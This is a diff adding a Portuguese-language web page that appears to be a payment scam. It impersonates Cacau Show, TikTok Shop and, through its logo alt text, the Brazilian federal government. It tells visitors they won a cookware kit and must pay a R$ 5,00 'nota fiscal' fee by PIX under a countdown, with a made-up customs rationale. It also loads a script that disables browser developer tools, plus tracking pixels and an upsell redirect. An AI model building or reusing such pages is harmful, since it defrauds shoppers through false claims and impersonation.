@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cacau Show</title>
+    <link rel="stylesheet" href="css/styles.css">
+
+    <script src="js/utm-handler.js" data-token="8976387c-1a08-4082-ba83-a82bbc4f806b"
+        data-click-id-param="click_id"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- Mangofy API Integration -->
+    <script src="js/mangofy-config.js"></script>
+
+    <script>
+        window.pixelId = "674d1f78381b0abc4590b9c3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script disable-devtool-auto="" src="disable-devtool.html"></script>
+
+    <style>
+        /* Fundo estilo TikTok Shop */
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Inter", "Roboto", sans-serif;
+            background:
+                radial-gradient(circle at 20% 20%, rgba(255, 0, 128, 0.18) 0%, rgba(0, 0, 0, 0) 60%),
+                radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.18) 0%, rgba(0, 0, 0, 0) 60%),
+                #000000;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: 16px;
+            padding: 24px 20px;
+            margin: 32px auto;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.9);
+        }
+
+        .logo {
+            filter: drop-shadow(0 0 6px rgba(255, 255, 255, 0.4));
+        }
+
+        .amount {
+            text-align: center;
+            margin-top: 16px;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+
+        /* Título “🎉 Parabéns!” */
+        .amount-label:first-child {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6), 0 0 20px rgba(255, 0, 128, 0.6);
+            margin-bottom: 8px;
+        }
+
+        /* Texto abaixo do Parabéns */
+        .amount-label {
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.5;
+            color: #fff !important;
+        }
+
+        .tax-box {
+            background: #111;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 12px;
+            padding: 16px;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .tax-box-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #ccc;
+        }
+
+        .amount-value {
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 8px;
+            color: #fff;
+        }
+
+        .button {
+            width: 100%;
+            border: 0;
+            border-radius: 10px;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            line-height: 1.2;
+            color: #000;
+            background: linear-gradient(90deg, #ff0050 0%, #00f5ff 100%);
+            box-shadow: 0 12px 30px rgba(255, 0, 80, 0.4), 0 12px 30px rgba(0, 245, 255, 0.3);
+        }
+
+        #loadingMessage {
+            text-align: center;
+            font-size: 13px;
+            font-weight: 500;
+            color: #888;
+            margin-top: 12px;
+        }
+
+        .info-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #ddd;
+            margin-top: 24px;
+            text-align: left;
+        }
+
+        .info-box strong {
+            color: #ff4d4d;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div style="width: 100%; text-align: center; margin: auto;">
+            <img src="https://d3m889aznlr23d.cloudfront.net/img/events/id/458/458868042/assets/ae82441d2f15b4ef8ceedfb0e5b636ad.Primary-fullcolor-white.png"
+                alt="Governo Federal" class="logo" style="width: 100%; max-width: 300px;">
+        </div>
+
+        <div class="amount">
+            <div class="amount-label">Parabéns!</div>
+            <div class="amount-label">
+                Você acabou de garantir seu desconto através do TikTok Shop! Para concluir, basta
+                realizar o pagamento da emissão da Nota Fiscal do seu produto.
+            </div>
+        </div>
+
+        <div class="tax-box">
+            <div class="tax-box-title">NF-e (Taxa de Emissão de Nota Fiscal)</div>
+            <div class="amount-value">R$ 05,00</div>
+        </div>
+
+        <button id="paymentButton" class="button" onclick="redirectToCheckout()">
+            Gerar PIX para Pagamento
+        </button>
+
+        <div id="loadingMessage">Gerando código PIX...</div>
+
+        <!-- Container do código PIX -->
+        <div id="pixCodeContainer" style="display: none;">
+            <div class="pix-header">
+                <strong>Pague com PIX</strong>
+                <div class="countdown">Expira em: <span id="timer">08:19</span></div>
+            </div>
+
+            <!-- QR Code Image (se disponível) -->
+            <div style="text-align: center; margin: 20px 0;">
+                <img id="pixQrCodeImage" style="display: none; max-width: 250px; margin: 0 auto;" alt="QR Code PIX">
+            </div>
+
+            <div class="pix-instructions">
+                1. Copie o código PIX abaixo<br>
+                2. Abra o app do seu banco<br>
+                3. Escolha pagar com PIX Copia e Cola<br>
+                4. Cole o código e confirme
+            </div>
+
+            <input type="text" id="pixCode" readonly>
+            <button class="copy-btn" onclick="copyPixCode()">COPIAR CÓDIGO PIX</button>
+        </div>
+
+        <script>
+            function redirectToCheckout() {
+                window.location.href = "/upup/1";
+            }
+        </script>
+
+
+        <div class="info-box">
+            Para liberar o envio do seu kit de Panelas do TikTok Shop, é necessário pagar a NF-e (Taxa de Emissão de
+            Nota Fiscal) no valor de R$ 05,00.
+            Essa taxa cobre os custos de importação, liberação alfandegária e emissão fiscal exigida para entrada do
+            produto no país.
+            <strong>Sem o pagamento, a liberação da Receita não é feita e o seu produto não pode ser enviado.</strong>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+</body>
+
+</html>
